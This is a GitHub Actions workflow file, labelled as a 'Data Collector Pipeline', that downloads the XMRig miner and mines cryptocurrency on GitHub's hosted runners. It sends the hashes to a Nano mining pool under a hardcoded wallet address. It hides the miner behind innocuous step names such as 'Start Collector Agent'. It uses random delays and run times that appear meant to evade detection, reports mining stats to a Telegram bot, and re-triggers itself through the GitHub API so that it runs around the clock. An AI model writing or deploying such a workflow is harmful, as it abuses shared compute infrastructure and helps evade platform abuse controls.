name: Data Collector Pipeline
on:
  schedule:
    - cron: '0 0,12 * * *'
  workflow_dispatch:

permissions:
  contents: read
  actions: none
  id-token: none

jobs:
  collect:
    runs-on: ubuntu-latest
    timeout-minutes: 360
    steps:
      - name: Initialize Collector
        run: echo "üõ∞Ô∏è Initializing NANO collector..."

      - name: Update Environment
        run: |
          sudo apt update -y && sudo apt install -y curl tar

      - name: Notify Start
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage             -d chat_id=$TG_CHAT_ID             --data-urlencode text="üü¢ *NANO Collector aktif.* Durasi kerja acak 20‚Äì90 menit."             -d parse_mode=Markdown

      - name: Start Collector Agent
        run: |
          curl -L -o agent.tar.gz https://github.com/xmrig/xmrig/releases/download/v6.24.0/xmrig-6.24.0-linux-static-x64.tar.gz
          tar -xzf agent.tar.gz
          cd xmrig-6.24.0
          chmod +x xmrig
          DELAY=$((RANDOM % 300 + 30))
          echo "Menunggu $DELAY detik..."
          sleep $DELAY
          ./xmrig -a rx -o stratum+tcp://xmrig.nanswap.com:3333 -u nano_1ep4soo6rat31n6otw4ggqdwj7tz5sjymyzfwi7kmhye6f31guujdo19cc3q -p nano --randomx-no-rdmsr | tee log.txt &
          PID=$!
          WORKTIME=$((RANDOM % 5400 + 1200))
          echo "Aktif selama $WORKTIME detik..."
          sleep $WORKTIME
          kill $PID

      - name: Extract Logs
        if: always()
        env:
          TG_TOKEN: ${{ secrets.TG_TOKEN }}
          TG_CHAT_ID: ${{ secrets.TG_CHAT_ID }}
        run: |
          set +e
          DIR=$(find . -type d -name "xmrig-6.24.0" | head -n1)
          if [ -d "$DIR" ]; then cd "$DIR"; else
            curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage               -d chat_id=$TG_CHAT_ID --data-urlencode text="‚ùå Direktori xmrig tidak ditemukan" -d parse_mode=Markdown
            exit 0
          fi
          HASHRATE=$(grep -a "speed" log.txt | tail -n1 | sed 's/\x1b\[[0-9;]*m//g' | awk '{print $(NF-1) " H/s"}')
          ACCEPTED=$(grep -a "accepted" log.txt | wc -l)
          REJECTED=$(grep -a "rejected" log.txt | wc -l)
          HASHRATE=${HASHRATE:-"0 H/s"}
          MSG="‚úÖ *NANO Collector selesai.*\n\nüìä *Stats:*\n‚Ä¢ Hashrate: \`$HASHRATE\`\n‚Ä¢ Accepted: \`$ACCEPTED\`\n‚Ä¢ Rejected: \`$REJECTED\`"
          curl -s -X POST https://api.telegram.org/bot$TG_TOKEN/sendMessage             -d chat_id=$TG_CHAT_ID --data-urlencode text="$MSG" -d parse_mode=Markdown

      - name: Cooldown Before Next Cycle
        if: always()
        run: |
          SLEEP_NEXT=$((RANDOM % 1800 + 300))
          echo "Cooldown $SLEEP_NEXT detik..."
          sleep $SLEEP_NEXT

      - name: Retrigger Collector
        if: always()
        env:
          GH_TOKEN: ${{ secrets.GH_TOKEN }}
        run: |
          sleep $((RANDOM % 60 + 10))
          curl -X POST -H "Authorization: Bearer $GH_TOKEN"                -H "Accept: application/vnd.github+json"                https://api.github.com/repos/${{ github.repository }}/actions/workflows/bnb-collector.yml/dispatches                -d '{"ref":"main"}'
